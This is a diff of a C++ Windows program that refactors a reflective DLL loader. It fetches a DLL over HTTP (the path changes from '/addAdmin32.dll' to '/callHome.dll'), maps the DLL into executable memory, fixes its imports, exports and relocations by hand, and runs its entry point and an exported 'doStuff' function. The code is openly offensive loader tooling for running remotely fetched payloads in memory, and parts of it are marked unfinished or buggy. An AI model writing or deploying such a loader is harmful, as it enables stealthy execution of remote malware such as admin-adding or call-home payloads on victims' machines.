@@ -3,20 +3,15 @@
 #include <cstring>
 #include <winhttp.h>
 
-#define WIN32_LEAN_AND_MEAN
-#pragma comment(lib, "winhttp.lib")
-int main(int argc, char* argv[]) {
 
+//#define WIN32_LEAN_AND_MEAN
+#pragma comment(lib, "winhttp.lib")
+
+char * downloadPE(HANDLE hHeap,HANDLE  hProcess,LPVOID lpHeapBuffer,int iBufferSize) {
     DWORD dwSize = 0;
     DWORD dwDownloaded = 0;
-    DWORD dwProcessId;
-    HANDLE hProcess;
-    HANDLE hHeap;
     HANDLE hThread;
-    LPVOID lpHeapBuffer;
-    LPSTR pszDecrypt;
     LPSTR pszOutBuffer;
-    LPSTR pszOutCompleteBuffer;
     BOOL  bResults = FALSE;
     HINTERNET  hSession = NULL,
         hConnect = NULL,
@@ -35,7 +30,7 @@ int main(int argc, char* argv[]) {
 
     // Create an HTTP request handle.
     if (hConnect)
-        hRequest = WinHttpOpenRequest(hConnect, L"GET", L"/addAdmin32.dll",
+        hRequest = WinHttpOpenRequest(hConnect, L"GET", L"/callHome.dll",
             NULL, WINHTTP_NO_REFERER,
             WINHTTP_DEFAULT_ACCEPT_TYPES,
             NULL
@@ -52,34 +47,11 @@ int main(int argc, char* argv[]) {
     // End the request.
     if (bResults)
         bResults = WinHttpReceiveResponse(hRequest, NULL);
-    //could be GetCurrentProcss <- retrieves pseudo handle ||FindWindowA 
-    //-> GetProcessId aswell
-    dwProcessId = GetProcessId((HANDLE)-1);
-    hProcess = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ, FALSE, dwProcessId );
-    if (!hProcess) {
-        printf("couldnt close process handle 0x%X", GetLastError());
-        return -1;
-    }
-    //size of bytes to allocate on the heap this will be the size for our dll to load
-    int iBufferSize = 20000;
-    hHeap = GetProcessHeap();
-    if (!hHeap) {
-        printf("couldnt allocate bytes on the heap 0x%X\n", GetLastError());
-        CloseHandle(hProcess);
-        return -1;
-    }
-    lpHeapBuffer = HeapAlloc(hHeap, NULL,iBufferSize);
-    if (!lpHeapBuffer) {
-        printf("couldnt allocate bytes on the heap 0x%X\n", GetLastError());
-        CloseHandle(hHeap);
-        CloseHandle(hProcess);
-        return -1;
-        }
     
-    //pszOutCompleteBuffer =new char[4096];
+
     int iOffset = 0;
     // Keep checking for data until there is nothing left.
-    if (bResults && iOffset <=iBufferSize)
+    if (bResults && iOffset <= iBufferSize)
     {
         do
         {
@@ -89,7 +61,7 @@ int main(int argc, char* argv[]) {
                 printf("Error %u in WinHttpQueryDataAvailable.\n",
                     GetLastError());
             }
-           
+
             // Allocate space for the buffer.
             pszOutBuffer = new char[dwSize + 1];
             if (!pszOutBuffer)
@@ -102,18 +74,18 @@ int main(int argc, char* argv[]) {
                 // Read the data.
                 ZeroMemory(pszOutBuffer, dwSize + 1);
 
-                if (!WinHttpReadData(hRequest, (LPVOID)pszOutBuffer,dwSize, &dwDownloaded))
+                if (!WinHttpReadData(hRequest, (LPVOID)pszOutBuffer, dwSize, &dwDownloaded))
                 {
                     printf("Error %u in WinHttpReadData.\n", GetLastError());
-                    
+
                 }
                 else
                 {
                     printf("%s", pszOutBuffer);
                     //ReadFile(hRequest, &lpHeapBuffer[iOffset], dwSize+1, NULL, NULL)
                     // could also go with virtual alloc
-                    std::memcpy((LPVOID)(((char *)lpHeapBuffer + iOffset)), pszOutBuffer, dwSize);
-                    //sprintf_s(pszOutCompleteBuffer+iOffset-dwSize, sizeof(pszOutBuffer), "%s", pszOutBuffer);
+                    std::memcpy((LPVOID)(((char*)lpHeapBuffer + iOffset)), pszOutBuffer, dwSize);
+                   
                 }
                 // Free the memory allocated to the buffer.
                 delete[] pszOutBuffer;
@@ -122,90 +94,198 @@ int main(int argc, char* argv[]) {
         } while (dwSize > 0);
     }
     char* bpBuffer = (char*)lpHeapBuffer;
+
+    if (hRequest) WinHttpCloseHandle(hRequest);
+    if (hConnect) WinHttpCloseHandle(hConnect);
+    if (hSession) WinHttpCloseHandle(hSession);
+    
+    return bpBuffer;
+}
+
+
+
+
+int mapSections(void* lpImage, char* bpBuffer,IMAGE_DOS_HEADER* lpDosHeaderOld,IMAGE_NT_HEADERS* lpPeHeaderOld) {
+
+
+    //map header
+    std::memcpy(lpImage, bpBuffer, 0x1000);
+
+    //map sections
+    int iNumberSections = lpPeHeaderOld->FileHeader.NumberOfSections;
+    DWORD iOffsetStartSectionHeader = lpDosHeaderOld->e_lfanew + sizeof(IMAGE_NT_HEADERS);
+    auto lpStartSectionHeader = reinterpret_cast<IMAGE_SECTION_HEADER*>(bpBuffer + iOffsetStartSectionHeader);
+    int iVSectionAlign = lpPeHeaderOld->OptionalHeader.SectionAlignment;
+    int iOverflowSection = 0;
+    for (int i = 0; i < iNumberSections; i++) {
+        //map each section at the correct offset
+        std::memcpy((LPVOID*)((DWORD)lpImage + (DWORD)iVSectionAlign * (i + 1 + iOverflowSection)), bpBuffer + lpStartSectionHeader[i].PointerToRawData, iVSectionAlign);
+
+        int s = lpStartSectionHeader[i].SizeOfRawData;
+        if (s > iVSectionAlign) {
+            int iCurrentOverflowSection = s / iVSectionAlign;
+            for (int k = 1; k <= iCurrentOverflowSection; k++) {
+                std::memcpy((LPVOID*)((DWORD)lpImage + (DWORD)iVSectionAlign * (i + 1 + iOverflowSection + k)), bpBuffer + lpStartSectionHeader[i].PointerToRawData + (DWORD)iVSectionAlign * k, iVSectionAlign);
+            }
+            iOverflowSection += iCurrentOverflowSection;
+        }
+
+
+    }
+    return 0;
+}
+
+
+
+
+int fixImports(void* lpImage,IMAGE_NT_HEADERS* lpPeHeader) {
+    //fix image base
+    std::memcpy(&(lpPeHeader->OptionalHeader.ImageBase), &lpImage, sizeof(lpPeHeader->OptionalHeader.ImageBase));
+    //fix imports                              fix this !!!
+    auto lpImportDirectory = reinterpret_cast<IMAGE_IMPORT_DESCRIPTOR*>(lpPeHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress + (DWORD)lpImage);
+    // each directory entry has a size of 4 bytes*5 one directory is always empty
+    int iNumberOfImports = (lpPeHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].Size / (4 * 5)) - 1;
+    for (int i = 0; i < iNumberOfImports; i++) {
+        //might need to fix this
+        HMODULE hDLLModule = LoadLibraryA((LPCSTR)(lpImportDirectory[i].Name + (DWORD)lpImage));
+        //go over each IAT entry
+        for (int k = 0; k < lpPeHeader->OptionalHeader.SectionAlignment; k += 4) {
+            //check if entry is 00000 aka end of imports
+            if (!*(DWORD*)(lpImportDirectory[i].OriginalFirstThunk + k + (DWORD)lpImage))
+                break;
+            // load proc address by name in INT
+            // k describes the distanc between name pointers +2== hintsize
+            DWORD* dwTableNamePointer = (DWORD*)(lpImportDirectory[i].OriginalFirstThunk + k + (DWORD)lpImage);
+            DWORD* dwTableAddressPointer = (DWORD*)(lpImportDirectory[i].FirstThunk + k + (DWORD)lpImage);
+            LPCSTR lpszProcName = (LPCSTR)(*dwTableNamePointer) + 2 + (DWORD)lpImage;
+            auto lpProcAddress = GetProcAddress(hDLLModule, lpszProcName);
+            // copy proc address to the IAT 
+            std::memcpy(dwTableAddressPointer, &lpProcAddress, sizeof(lpProcAddress));
+        }
+
+    }
+    return 0;
+}
+
+int fixExports(void* lpImage, IMAGE_NT_HEADERS* lpPeHeader) {
+
+    //fix Exports                              fix this !!!
+    auto lpExportDirectory = reinterpret_cast<IMAGE_EXPORT_DIRECTORY*>(lpPeHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress + (DWORD)lpImage);
+
+    int iNumberOfExports = lpExportDirectory->NumberOfFunctions;
+    for (int i = 0; i < iNumberOfExports; i++) {
+        //might need to fix this
+
+
+        DWORD* lpTableNamePointer = (DWORD*)((lpExportDirectory->AddressOfNames) + i * 4 + (DWORD)lpImage);
+        DWORD lpTableNamePointerTVA = ((DWORD)lpImage + *lpTableNamePointer);
+        std::memcpy((void*)lpTableNamePointer, &lpTableNamePointerTVA, sizeof(lpTableNamePointerTVA));
+
+        DWORD* lpTableFunctionsPointer = (DWORD*)((lpExportDirectory->AddressOfFunctions) + i * 4 + (DWORD)lpImage);
+        DWORD lpTableFunctionsPointerTVA = ((DWORD)lpImage + *lpTableFunctionsPointer);
+        std::memcpy((void*)lpTableFunctionsPointer, &lpTableFunctionsPointerTVA, sizeof(lpTableFunctionsPointerTVA));
+         
+    }
+    return 0;
+}
+
+int fixRelocations(void* lpImage, IMAGE_NT_HEADERS* lpPeHeader,IMAGE_NT_HEADERS* lpPeHeaderOld) {
+    //fix relocations
+    int iSizeCounter = lpPeHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size;
+    auto lpBaseRelocDir = reinterpret_cast<IMAGE_BASE_RELOCATION*>(lpPeHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress + (DWORD)lpImage);
+    DWORD dwImageBaseOld = lpPeHeaderOld->OptionalHeader.ImageBase;
+    
+    
+    //DWORD iImageBaseNewDelta = (DWORD)lpImage - dwImageBaseOld;
+    
+    DWORD dwRVABlock;
+    DWORD dwRVABlockSize;
+
+    for (int iOffsetReloc = 0; iOffsetReloc < iSizeCounter;) {
+        dwRVABlock = (reinterpret_cast<IMAGE_BASE_RELOCATION*>(iOffsetReloc + (BYTE*)lpBaseRelocDir))->VirtualAddress;
+        dwRVABlockSize = (reinterpret_cast<IMAGE_BASE_RELOCATION*>(iOffsetReloc + (BYTE*)lpBaseRelocDir))->SizeOfBlock;
+        
+        //skip last entry
+        for (int k = sizeof(DWORD) * 2; k < dwRVABlockSize - sizeof(WORD); k += sizeof(WORD)) {
+            WORD* lpFixupAddress = (WORD*)((BYTE*)lpBaseRelocDir + k+iOffsetReloc);
+            DWORD* lpAddressToChange = (DWORD*)((*lpFixupAddress & 0x0FFF) + dwRVABlock + (DWORD)lpImage);
+            DWORD lpNewAddress = ((*lpAddressToChange ^ dwImageBaseOld) + (DWORD)lpImage);
+            std::memcpy(lpAddressToChange, &lpNewAddress, sizeof(DWORD));
+        }
+        iOffsetReloc += dwRVABlockSize;
+
+    }
+
+    return 0;
+}
+
+int main(int argc, char* argv[]) {
+
+
+    LPVOID lpHeapBuffer;
+    LPSTR pszDecrypt;
+    LPSTR pszOutBuffer;
+    HANDLE hProcess;
+    HANDLE hHeap;
+    DWORD dwProcessId;
+
+
+    //could be GetCurrentProcss <- retrieves pseudo handle ||FindWindowA 
+    //-> GetProcessId aswell
+    dwProcessId = GetProcessId((HANDLE)-1);
+    hProcess = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ, FALSE, dwProcessId);
+    if (!hProcess) {
+        printf("couldnt close process handle 0x%X", GetLastError());
+        return -1;
+    }
+    //size of bytes to allocate on the heap this will be the size for our dll to load
+    int iBufferSize = 20000;
+    hHeap = GetProcessHeap();
+    if (!hHeap) {
+        printf("couldnt allocate bytes on the heap 0x%X\n", GetLastError());
+        CloseHandle(hProcess);
+        return -1;
+    }
+    lpHeapBuffer = HeapAlloc(hHeap, NULL, iBufferSize);
+    if (!lpHeapBuffer) {
+        printf("couldnt allocate bytes on the heap 0x%X\n", GetLastError());
+        CloseHandle(hHeap);
+        CloseHandle(hProcess);
+        return -1;
+    }
+
+    char* bpBuffer = downloadPE(hHeap, hProcess,lpHeapBuffer, iBufferSize);
+
     //BOOL VirtualProtectEx(HANDLE hProcess,LPVOID lpAddress,SIZE_T dwSize,DWORD  flNewProtect,PDWORD lpflOldProtect);
     //BOOL VirtualProtect(LPVOID lpAddress,SIZE_T dwSize,DWORD  flNewProtect,PDWORD lpflOldProtect);
     auto lpDosHeaderOld = reinterpret_cast<IMAGE_DOS_HEADER*>(bpBuffer);
     auto lpPeHeaderOld = reinterpret_cast<IMAGE_NT_HEADERS*>(bpBuffer + lpDosHeaderOld->e_lfanew);
     void * lpImage  =  VirtualAlloc(NULL, lpPeHeaderOld->OptionalHeader.SizeOfImage,MEM_RESERVE | MEM_COMMIT,PAGE_EXECUTE_READWRITE);
+
     if (!lpImage) {
         printf("couldnt allocate memory : 0x%X\n", GetLastError());
         HeapFree(hHeap, 0, lpHeapBuffer);
         CloseHandle(hProcess);
+        return 0;
     }
 
-    //map header
-    std::memcpy(lpImage, bpBuffer, 0x1000);
-    
-    //map sections
-    int iNumberSections = lpPeHeaderOld->FileHeader.NumberOfSections;
-    DWORD iOffsetStartSectionHeader = lpDosHeaderOld->e_lfanew + sizeof(IMAGE_NT_HEADERS);
-    auto lpStartSectionHeader = reinterpret_cast<IMAGE_SECTION_HEADER*>(bpBuffer +iOffsetStartSectionHeader);
-    int iVSectionSize =lpPeHeaderOld->OptionalHeader.SectionAlignment;
-    for (int i = 0; i < iNumberSections; i++) {
-        int s = lpStartSectionHeader[i].SizeOfRawData;
-        
-        //map each section at the correct offset
-        std::memcpy((LPVOID *)((DWORD)lpImage +(DWORD)iVSectionSize * (i+1)), bpBuffer + lpStartSectionHeader[i].PointerToRawData, iVSectionSize);
-                   
-    }
+    mapSections(lpImage, bpBuffer,lpDosHeaderOld, lpPeHeaderOld);
 
     (IMAGE_DOS_HEADER*)lpImage;
     auto lpPeHeader = reinterpret_cast<IMAGE_NT_HEADERS*>((DWORD)lpImage+lpDosHeaderOld->e_lfanew);
-    //fix image base
-    std::memcpy(&(lpPeHeader->OptionalHeader.ImageBase) , &lpImage, sizeof(lpPeHeader->OptionalHeader.ImageBase));
-    //fix imports                              fix this !!!
-    auto lpImportDirectory = reinterpret_cast<IMAGE_IMPORT_DESCRIPTOR*>(lpPeHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress+(DWORD) lpImage);
-    // each directory entry has a size of 4 bytes*5 one directory is always empty
-    int iNumberOfImports= (lpPeHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].Size / (4*5))-1;    
-    for (int i = 0; i < iNumberOfImports;i++ ) {
-        //might need to fix this
-        HMODULE hDLLModule = LoadLibraryA((LPCSTR)(lpImportDirectory[i].Name+(DWORD)lpImage));
-        //go over each IAT entry
-        for (int k = 0; k < lpPeHeader->OptionalHeader.SectionAlignment; k += 4) {
-            //check if entry is 00000 aka end of imports
-            if (!*(DWORD *)(lpImportDirectory[i].OriginalFirstThunk + k+(DWORD)lpImage))
-                break;
-            // load proc address by name in INT
-            // k describes the distanc between name pointers +2== hintsize
-            DWORD* dwTableNamePointer = (DWORD *)(lpImportDirectory[i].OriginalFirstThunk + k + (DWORD)lpImage);
-            DWORD* dwTableAddressPointer = (DWORD *)(lpImportDirectory[i].FirstThunk + k + (DWORD)lpImage);
-            LPCSTR lpszProcName = (LPCSTR)(*dwTableNamePointer) +2+(DWORD)lpImage;
-            auto lpProcAddr =GetProcAddress(hDLLModule, lpszProcName);
-            // copy proc address to the IAT 
-            std::memcpy(dwTableAddressPointer, &lpProcAddr, sizeof(lpProcAddr));
-        }
     
-    } 
+    fixImports(lpImage, lpPeHeader);
+   
+    fixExports(lpImage, lpPeHeader);
 
+    fixRelocations(lpImage, lpPeHeader, lpPeHeaderOld);
 
-    //fix relocations
-    int iSizeCounter = lpPeHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size;
-    auto lpBaseRelocDir = reinterpret_cast<IMAGE_BASE_RELOCATION*>(lpPeHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress+(DWORD)lpImage);
-    DWORD iImageBaseOld = lpPeHeaderOld->OptionalHeader.ImageBase;
-    DWORD iImageBaseNewDelta =(DWORD) lpImage - iImageBaseOld;
-    DWORD iRVABlock;
-    DWORD iRVABlockSize;
-
-    for (int bOffsetReloc = 0; bOffsetReloc < iSizeCounter;) {
-        iRVABlock =((IMAGE_BASE_RELOCATION *)(bOffsetReloc+(BYTE *)lpBaseRelocDir))->VirtualAddress;
-        iRVABlockSize = ((IMAGE_BASE_RELOCATION*)(bOffsetReloc+(BYTE *)lpBaseRelocDir))->SizeOfBlock;
-        bOffsetReloc += iRVABlockSize;
-        //skip last entry
-        for (int k = sizeof(DWORD) * 2; k < iRVABlockSize - sizeof(WORD); k += sizeof(WORD)) {
-            WORD* lpFixupAddress = (WORD*)((BYTE*)lpBaseRelocDir + k);
-            DWORD* lpAddressToChange = (DWORD*)((*lpFixupAddress & 0x0FFF) +iRVABlock +(DWORD)lpImage);
-            DWORD lpNewAddr = ((*lpAddressToChange ^ iImageBaseOld )+(DWORD)lpImage);
-            std::memcpy(lpAddressToChange, &lpNewAddr, sizeof(DWORD));
-        }
-
-
-    }
     int iSizeOfCode = lpPeHeader->OptionalHeader.SectionAlignment;
     printf("\nBase of Image%x\n", (DWORD)lpImage);
     printf("\nBase of Code%x\n", lpPeHeader->OptionalHeader.BaseOfCode);
     //                                                                              64 vs 32 bit on base of code
     //if (VirtualProtect((LPVOID)((DWORD)lpImage+ 0x1000), lpPeHeader->OptionalHeader.BaseOfData - lpPeHeader->OptionalHeader.BaseOfCode, PAGE_EXECUTE_READ, NULL))
-    if (VirtualProtect((LPVOID)((DWORD)lpImage + 0x1000), iRVABlockSize *iNumberSections, PAGE_EXECUTE_READ, NULL))
+    if (VirtualProtect((LPVOID)((DWORD)lpImage),lpPeHeader->OptionalHeader.SizeOfImage, PAGE_EXECUTE_READ, NULL))
         printf("Coldnt change PAGE protection: %x\n", GetLastError());
     
     
@@ -214,7 +294,14 @@ int main(int argc, char* argv[]) {
     HANDLE hThreadInjected=CreateThread(NULL, 0, lpEntry, NULL, DLL_PROCESS_ATTACH, NULL);
     if (!hThreadInjected) {
         printf("thread couldnt be created with error: %x", GetLastError());
-    }
+        
+        
+    }    
+    // load my doStuff function
+    auto lpExportDirectory = reinterpret_cast<IMAGE_EXPORT_DIRECTORY*>(lpPeHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress + (DWORD)lpImage);
+    auto lpEATFirstFunc=(DWORD *)(lpExportDirectory->AddressOfFunctions + (DWORD)lpImage);
+    FARPROC  doStuff =(FARPROC )*lpEATFirstFunc;
+    doStuff();
    
     HeapFree(hHeap, 0, lpHeapBuffer);
     //CloseHandle(hHeap);
@@ -222,15 +309,7 @@ int main(int argc, char* argv[]) {
         Sleep(1);
     }
     CloseHandle(hProcess);
-    //printf("%s", pszOutCompleteBuffer);
-    //delete[] pszOutCompleteBuffer;
-    // Report any errors.
-    if (!bResults)
-        printf("Error %d has occurred.\n", GetLastError());
 
-    // Close any open handles.
-    if (hRequest) WinHttpCloseHandle(hRequest);
-    if (hConnect) WinHttpCloseHandle(hConnect);
-    if (hSession) WinHttpCloseHandle(hSession);
+    return 0;
 
 }
